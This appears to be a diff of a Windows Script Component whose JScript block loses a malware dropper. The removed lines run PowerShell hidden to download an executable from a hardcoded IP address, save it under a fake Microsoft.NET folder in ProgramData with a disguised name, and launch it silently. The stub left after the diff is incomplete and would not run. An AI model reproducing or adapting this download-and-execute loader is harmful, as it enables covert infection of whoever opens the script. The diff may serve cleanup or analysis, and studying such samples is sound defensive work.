@@ -3,76 +3,20 @@
 	<component id="mOCUVATWpA">
 		<script language="JScript">
 			<![CDATA[
-			var isDownloaded;
-var isExecuted;
-var isFileExists;
-var randomIndex;
-var installPath;
-var fileSystem;
-var shell;
-var downloadUrl;
-var programDataPath;
-var logFile;
-var exeFile;
-
-isDownloaded = false;
-isExecuted = false;
-isFileExists = false;
-
-var executionCounter = 3;
-var downloadPath = "";
-
+			
 fileSystem = new ActiveXObject("Scripting.FileSystemObject");
-shell = new ActiveXObject("WScript.Shell");
-
-function downloadFile(url, outputPath) {
-    try {
-        shell.run('cmd /c powershell -Command "irm -Uri ' + "'" + url + "' -OutFile " + "'" + outputPath + "'" + '"', 0, true);
-        return true;
-    } catch (error) {
-        return false;
-    }
-}
 
 
 function executePayload() {
-    isExecuted = false;
-    
-    downloadUrl = "http://185.193.67.242/";  
-    
-    programDataPath = "C:\\ProgramData\\Public";
+   
     var fileName = "Tesla.QLED.02582.1336.595";
 
     try {
         fileSystem.CreateFolder(programDataPath);
     } catch (error) {}
-    
-    if (isFileExists) { isExecuted = false; }
-    
-    installPath = "C:\\ProgramData\\Microsoft.NET\\QLED" + fileName + "\\";
-    
-    if (!isExecuted) {
-        isExecuted = false;
-        
-        exeFile = fileName + ".exe";
-        
-        try { fileSystem.CreateFolder("C:\\ProgramData\\Microsoft.NET\\"); } catch (error) {}
-        try { fileSystem.CreateFolder(installPath); } catch (error) {}
-        
-        try { isDownloaded = downloadFile(downloadUrl + "calc.exe", installPath + exeFile); } catch (error) {}
-        
-        if (fileSystem.FileExists(installPath + exeFile)) {
-                try {
-                    isExecuted = true;
-                    shell.run(installPath + exeFile, 0, false);
-                } catch (error) {}
-        }
-    }
 }
 
 executePayload();
-
-
 
 			]]>
 		</script>
